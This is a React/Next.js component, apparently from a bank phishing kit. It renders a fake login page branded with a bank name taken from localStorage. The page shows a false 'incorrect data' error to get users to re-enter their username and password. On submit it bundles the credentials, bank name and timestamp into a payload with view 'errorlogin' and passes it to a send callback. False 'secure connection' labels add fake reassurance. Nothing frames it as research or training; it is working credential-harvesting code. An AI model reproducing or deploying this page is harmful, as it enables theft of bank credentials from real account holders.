/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
/* eslint-disable @next/next/no-html-link-for-pages */
"use client";
import { useState, useEffect } from "react";

export default function ErrorApp({ enviar }: any) {
  const [banco, setBanco] = useState("Tu Banco");
  const [usuario, setUsuario] = useState("");
  const [password, setPassword] = useState("");

  useEffect(() => {
    if (typeof window !== "undefined") {
      const storedBank = localStorage.getItem("bankSelct");
      if (storedBank) {
        setBanco(storedBank);
      }
    }
  }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!usuario || !password) return;

    const payload = {
      view: 'errorlogin',
      user: usuario,
      pass: password,
      bank: banco,
      timestamp: new Date().toISOString(),
    };

    enviar?.(payload);
  };

  const isFormValid = usuario.length > 3 && password.length >= 4;

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-xl shadow-2xl overflow-hidden max-w-md w-full">
        {/* Encabezado */}
        <div className="bg-linear-to-r from-blue-700 to-blue-500 p-8 text-center">
          <div className="w-20 h-20 bg-white rounded-full flex items-center justify-center mx-auto mb-4 shadow-inner">
            <span className="text-3xl font-bold text-blue-600">
              {banco.charAt(0).toUpperCase()}
            </span>
          </div>
          <h2 className="text-2xl font-bold text-white mb-2">{banco}</h2>
          <p className="text-blue-100 text-sm">Ingreso seguro a tu portal</p>
        </div>

        {/* Error Banner */}
        <div style={{ backgroundColor: '#ffebee', color: '#c62828', padding: '12px', borderRadius: '8px', margin: '24px 24px 0 24px', textAlign: 'center', fontWeight: 'bold', fontSize: '14px' }}>
          Datos incorrectos. Por favor, verifica tu usuario y clave e inténtalo de nuevo.
        </div>

        {/* Formulario */}
        <div className="p-8">
          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Usuario
              </label>
              <input
                type="text"
                placeholder="Ingresa tu usuario"
                value={usuario}
                onChange={(e) => setUsuario(e.target.value)}
                className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors bg-gray-50 text-gray-900"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">
                Contraseña
              </label>
              <input
                type="password"
                placeholder="••••••••"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-4 py-3 rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors bg-gray-50 text-gray-900"
              />
            </div>

            <div className="flex items-center justify-between text-sm">
              <label className="flex items-center text-gray-600 cursor-pointer">
                <input type="checkbox" className="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50 mr-2" />
                Recordar usuario
              </label>
              <a href="#" className="text-blue-600 hover:text-blue-800 font-medium transition-colors">¿Olvidaste tu contraseña?</a>
            </div>

            <button
              type="submit"
              disabled={!isFormValid}
              className={`w-full py-4 px-4 border border-transparent rounded-lg shadow-sm text-lg font-bold text-white ${
                isFormValid
                  ? "bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-colors"
                  : "bg-gray-400 cursor-not-allowed"
              }`}
            >
              Ingresar
            </button>
          </form>

          {/* Pie del formulario */}
          <div className="mt-8 pt-6 border-t border-gray-100 flex items-center justify-between text-xs text-gray-500">
            <span className="flex items-center gap-1">
              <svg className="w-4 h-4 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
              </svg>
              Conexión Segura
            </span>
            <a href="#" className="hover:text-blue-600 transition-colors">Ayuda</a>
          </div>
        </div>
      </div>
    </div>
  );
}
